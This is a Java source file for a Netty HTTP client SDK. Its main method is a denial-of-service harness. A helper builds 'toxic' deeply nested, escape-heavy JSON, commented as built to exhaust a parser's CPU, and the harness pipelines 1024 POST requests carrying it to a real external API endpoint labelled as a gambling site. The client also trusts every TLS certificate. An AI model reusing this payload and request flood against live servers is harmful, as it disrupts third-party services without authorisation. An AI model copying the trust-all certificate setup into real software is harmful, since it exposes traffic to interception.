package gzb.sdk;

import gzb.frame.factory.ContentType;
import gzb.tools.Config;
import gzb.tools.NettyTools;
import gzb.tools.Tools;
import gzb.tools.log.Log;
import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.epoll.EpollChannelOption;
import io.netty.channel.epoll.EpollEventLoopGroup;
import io.netty.channel.epoll.EpollSocketChannel;
import io.netty.channel.socket.SocketChannel;
import io.netty.handler.codec.http.*;

import java.io.IOException;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.LinkedBlockingQueue;

public class HTTP {
    static {
        Config.get("0");
    }

    public static String generateToxicJson(int minLength) {
        StringBuilder sb = new StringBuilder();
        // 头部：开启深度嵌套
        int depth = 0;
        while (sb.length() < minLength / 2) {
            sb.append("{\"a\":");
            depth++;
        }

        // 中间层：放入大量转义字符和冗余数据
        sb.append("\"");
        while (sb.length() < minLength - depth) {
            // 大量转义字符会迫使解析器不断处理转义逻辑，非常耗 CPU
            sb.append("\\u0000\\n\\r\\t\\b\\f\\\\\\\"");
        }
        sb.append("\"");

        // 尾部：闭合所有括号
        for (int i = 0; i < depth; i++) {
            sb.append("}");
        }

        return sb.toString();
    }

    static int pip=1024;
    public static void main(String[] args) throws Exception {
        Map<String, String> map = new HashMap<>();
        map.put("content-type", "application/json; charset=utf-8");
        long time = System.currentTimeMillis() / 1000 - 1000;
        String json = "{\"agentName\":\"\",\"channelId\":6445600,\"currency\":\"CNY\",\"currency3_0\":" + generateToxicJson(100) + ",\"time\":";

        BaseSdk.Call call=new BaseSdk.Call(){
            @Override
            public void run(Object obj) {
                if (obj.getClass()==byte[].class) {

                    System.out.println(new String((byte[])obj));
                }
                if (pip==0) {
                    System.exit(1);
                }

            }
        };
        for (int n = 0; n < 1; n++) {
            for (int i = 0; i < pip; i++) {
                /// 赌博网站
                requestAsync("https://yuvs5s1gv9bsst6hvf07e0uiv.qst2n7.top/hall/api/agent/promote/getIpBindInfo", 1,
                        json + (time++) + "}", map, call, !(i < pip - 1));
            }

        }
        pip=0;

    }

    public static Log log = Log.log;
    static Map<String, HTTP> http_pool = new ConcurrentHashMap<>();

    public static HTTP readHttp(String url) throws IOException {
        if (url == null || url.length() < 7) {
            throw new RuntimeException("error " + url);
        }

        int port = -1;
        String host;

        int schemeEnd = url.indexOf("://");
        int hostStart = (schemeEnd == -1) ? 0 : schemeEnd + 3;

        int hostEnd = url.indexOf('/', hostStart);
        if (hostEnd == -1) {
            hostEnd = url.length();
        }

        String hostPart = url.substring(hostStart, hostEnd);

        if (hostPart.startsWith("[")) {
            int bracketEnd = hostPart.indexOf(']');
            if (bracketEnd != -1) {
                host = hostPart.substring(1, bracketEnd);
                int portColon = hostPart.indexOf(':', bracketEnd);
                if (portColon != -1) {
                    port = Integer.parseInt(hostPart.substring(portColon + 1));
                }
            } else {
                host = hostPart; // 格式异常回退
            }
        } else {
            int portColon = hostPart.indexOf(':');
            if (portColon != -1) {
                host = hostPart.substring(0, portColon);
                port = Integer.parseInt(hostPart.substring(portColon + 1));
            } else {
                host = hostPart;
            }
        }

        if (port == -1) {
            if (url.startsWith("https")) {
                port = 443;
            } else {
                port = 80;
            }
        }
        String key = host + ":" + port;
        int finalPort = port;
        return http_pool.computeIfAbsent(key, k -> {
            try {
                return new HTTP(host, finalPort, 1);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
    }

    public static String get(String url, long timeOut) throws Exception {
        return request0(url, 0, null, null, timeOut);
    }

    public static String post(String url, String data, long timeOut) throws Exception {
        return request0(url, 1, data, null, timeOut);
    }

    public static String put(String url, String data, long timeOut) throws Exception {
        return request0(url, 2, data, null, timeOut);
    }

    public static String delete(String url, long timeOut) throws Exception {
        return request0(url, 3, null, null, timeOut);
    }

    public static String request0(String url, int met, String data, Map<String, String> headers, long timeOut) throws Exception {
        HTTP http = readHttp(url);
        Tools.ThreadWakeUp threadWakeUp = new Tools.ThreadWakeUp();
        http.request(url, met, data, headers, new BaseSdk.Call() {
            @Override
            public void run(Object obj) {
                threadWakeUp.notifyActivation(obj);
            }
        }, true);
        byte[] bytes = threadWakeUp.waitActivationData(timeOut);
        return new String(bytes);
    }

    public static void requestAsync(String url, int met, String data, Map<String, String> headers, BaseSdk.Call call, boolean flush) throws Exception {
        HTTP http = readHttp(url);
        http.request(url, met, data, headers, call, flush);
    }

    private EventLoopGroup group = null;
    private Channel channel;
    private String host;
    private int port;
    LinkedBlockingQueue<BaseSdk.Call> queue = new LinkedBlockingQueue<>(1024);
    private static io.netty.handler.ssl.SslContext sslCtx;

    static {
        try {
            // 客户端模式，信任所有证书（适合爬虫或 SDK 调用）
            sslCtx = io.netty.handler.ssl.SslContextBuilder.forClient()
                    .trustManager(io.netty.handler.ssl.util.InsecureTrustManagerFactory.INSTANCE)
                    .build();
        } catch (Exception e) {
            log.e("SSL 初始化失败", e);
        }
    }

    public HTTP() {

    }

    public HTTP(String host, int port, int IO_THREADS) throws IOException {
        this.host = host;
        this.port = port;
        if (IO_THREADS < 1) {
            IO_THREADS = Runtime.getRuntime().availableProcessors();
        }
        Bootstrap b = new Bootstrap();
        group = new EpollEventLoopGroup(IO_THREADS);
        b.group(group)
                .channel(EpollSocketChannel.class)
                .option(ChannelOption.TCP_NODELAY, true)
                .handler(new ChannelInitializer<SocketChannel>() {
                    @Override
                    protected void initChannel(SocketChannel ch) {
                        ChannelPipeline p = ch.pipeline();
                        if (port == 443) {
                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));
                        }
                        p.addLast(new HttpClientCodec());
                        p.addLast(new HttpObjectAggregator(1024 * 1024 * 10));
                        p.addLast(new SdkHandler());
                    }
                });
        try {
            this.channel = b.connect(host, port).sync().channel();
        } catch (InterruptedException e) {
            throw new IOException("Netty HTTP 连接失败", e);
        }
    }


    private class SdkHandler extends SimpleChannelInboundHandler<FullHttpResponse> {
        @Override
        protected void channelRead0(ChannelHandlerContext ctx, FullHttpResponse msg) {
            ByteBuf content = msg.content();
            BaseSdk.Call call = queue.poll();
            if (call == null) {
                throw new RuntimeException("error response");
            }
            call.run(NettyTools.readByteBuf(content));
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            log.e("HTTP请求异常", cause);
            ctx.close();
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) throws Exception {
            log.d("链接已关闭: " + ctx.channel().remoteAddress());
            BaseSdk.Call call;
            Exception exception = new RuntimeException("reset");
            while ((call = queue.poll()) != null) {
                call.run(exception);
            }
            http_pool.remove(host + ":" + port);
            super.channelInactive(ctx);
        }
    }

    public void request(String url, int met, String params, Map<String, String> headers, BaseSdk.Call call, boolean flush) throws InterruptedException {
        FullHttpRequest request = null;
        int index = 0;
        index = url.indexOf("/", index);
        if (index < 1) {
            throw new RuntimeException("url error " + url);
        }
        index += 7;
        index = url.indexOf("/", index);
        if (index < 1) {
            url = "/";
        } else {
            url = url.substring(index);
        }

        if (met == 0) {
            request = new DefaultFullHttpRequest(
                    HttpVersion.HTTP_1_1, HttpMethod.GET, url);
        } else if (met == 1) {
            request = new DefaultFullHttpRequest(
                    HttpVersion.HTTP_1_1, HttpMethod.POST, url, Unpooled.wrappedBuffer(params.getBytes(Config.encoding)));
            request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());
            request.headers().set(HttpHeaderNames.CONTENT_TYPE, ContentType.from);
        } else if (met == 2) {
            request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.PUT, url, Unpooled.wrappedBuffer(params.getBytes(Config.encoding)));
            request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());
            request.headers().set(HttpHeaderNames.CONTENT_TYPE, ContentType.from);
        } else if (met == 3) {
            request = new DefaultFullHttpRequest(
                    HttpVersion.HTTP_1_1, HttpMethod.DELETE, url);
        } else {
            throw new RuntimeException("met error get or post or put or delete");
        }
        request.headers().set(HttpHeaderNames.HOST, host);
        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);
        if (headers != null) {
            for (Map.Entry<String, String> stringStringEntry : headers.entrySet()) {
                request.headers().set(stringStringEntry.getKey(), stringStringEntry.getValue());
            }
        }

        queue.put(call);
        if (flush) {
            channel.writeAndFlush(request);
        } else {
            channel.write(request);
        }

    }

    public void close() {
        if (channel != null) channel.close();
        group.shutdownGracefully();
    }
}